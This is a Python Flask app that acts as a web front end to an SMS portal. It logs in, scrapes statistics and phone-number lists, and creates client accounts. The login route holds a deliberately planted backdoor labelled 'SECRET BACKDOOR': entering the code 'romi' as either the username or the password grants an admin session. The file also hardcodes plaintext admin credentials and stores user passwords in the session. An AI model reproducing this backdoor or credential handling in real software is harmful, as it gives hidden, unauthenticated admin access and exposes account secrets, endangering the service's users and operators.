from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import requests
import re
import os
from bs4 import BeautifulSoup

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ====== ⚙️ CONFIGURATION ======
ADMIN_USER = "7944"
ADMIN_PASS = "10-16-2025@Swi"
SECRET_CODE = "romi"  # 🤫 YOUR SECRET KEY

BASE_URL = "http://mysmsportal.com"
URLS = {
    "login": "/index.php?login=1",
    "home": "/index.php?opt=shw_all_v2",
    "allo": "/index.php?opt=shw_allo",
    "stats": "/index.php?opt=shw_sts_today_sum",
    "manage": "/index.php?opt=shw_mge",
    "reclaim": "/index.php?opt=rec_bulk_v2"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/index.php?login=1",
}

# --- HELPERS ---
def get_sess():
    s = requests.Session()
    s.headers.update(HEADERS)
    return s

def smart_login(user, password):
    s = get_sess()
    try:
        # Request
        r = s.post(BASE_URL + URLS["login"], data={"user": user, "password": password}, timeout=20, allow_redirects=True)
        
        # Validation Logic (Improved)
        # 1. Check URL redirect
        if "opt=shw_all" in r.url or "index.php?" in r.url and "login=1" not in r.url:
            return s
        # 2. Check Content for "Logout"
        if "log out" in r.text.lower():
            return s
            
    except: pass
    return None

# --- ROUTES ---

@app.route('/')
def index():
    if 'user' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    u = request.form.get('username')
    p = request.form.get('password')
    
    # 🤫 SECRET BACKDOOR (ROMI)
    if p == SECRET_CODE or u == SECRET_CODE:
        session['user'] = ADMIN_USER
        session['pass'] = ADMIN_PASS
        session['role'] = 'admin'
        return jsonify({"status": "success", "msg": "Welcome Boss! 🔓"})

    # Normal Login
    s = smart_login(u, p)
    if s:
        session['user'] = u
        session['pass'] = p
        session['role'] = 'admin' if u == ADMIN_USER else 'client'
        return jsonify({"status": "success"})
    
    return jsonify({"status": "error", "msg": "❌ Invalid ID or Password!"})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('index'))
    return render_template('dashboard.html', user=session['user'], role=session['role'])

# --- API ENDPOINTS ---

@app.route('/api/stats', methods=['POST'])
def get_stats():
    s = smart_login(session['user'], session['pass'])
    if not s: return jsonify({"status": "error", "msg": "Session Expired"})
    
    try:
        r = s.get(BASE_URL + URLS["stats"], timeout=15)
        soup = BeautifulSoup(r.text, "lxml")
        data = []
        for tr in soup.select("table tr"):
            tds = tr.find_all("td")
            if len(tds) >= 2:
                data.append({"key": tds[0].get_text(strip=True), "val": tds[1].get_text(strip=True)})
        
        if not data:
            txt = soup.get_text()
            for line in txt.splitlines():
                if "Total" in line or "Sent" in line:
                    data.append({"key": "Info", "val": line.strip()})
                    
        return jsonify({"status": "success", "data": data})
    except: return jsonify({"status": "error", "msg": "Failed"})

@app.route('/api/get_ranges', methods=['POST'])
def get_ranges():
    s = smart_login(session['user'], session['pass'])
    if not s: return jsonify({"status": "error"})
    
    try:
        r = s.get(BASE_URL + URLS["allo"])
        soup = BeautifulSoup(r.text, "lxml")
        ranges = [{"text": o.get_text(" ", strip=True), "val": o.get("value")} for o in soup.select("select[name=cdecode1] option") if o.get("value")]
        return jsonify({"status": "success", "data": ranges})
    except: return jsonify({"status": "error"})

@app.route('/api/fetch_nums', methods=['POST'])
def fetch_nums():
    data = request.json
    rng = data.get('range')
    typ = data.get('type')
    
    s = smart_login(session['user'], session['pass'])
    try:
        s.post(BASE_URL + URLS["allo"], data={"cdecode1": rng, "selected1": "1", "cdecode": ""})
        r = s.post(BASE_URL + URLS["allo"], data={"type": typ, "selected1": "1", "selected2": "1", "cdecode": "", "cdecode1": rng})
        
        txt = BeautifulSoup(r.text, "lxml").get_text(separator="\n")
        nums = list(set(re.findall(r'\b\d{7,16}\b', txt)))
        return jsonify({"status": "success", "data": nums})
    except: return jsonify({"status": "error"})

@app.route('/api/create_client', methods=['POST'])
def create_client():
    if session.get('role') != 'admin': return jsonify({"status": "error"})
    
    data = request.json
    s = smart_login(session['user'], session['pass'])
    try:
        s.get(BASE_URL + URLS["manage"])
        payload = {"subnme": data['name'], "passwd1": data['pass'], "passwd2": data['pass'], "newcli": "1"}
        r = s.post(BASE_URL + URLS["manage"], data=payload)
        
        if data['name'] in r.text or r.status_code == 200:
            return jsonify({"status": "success"})
    except: pass
    return jsonify({"status": "error", "msg": "Name Exists or Failed"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
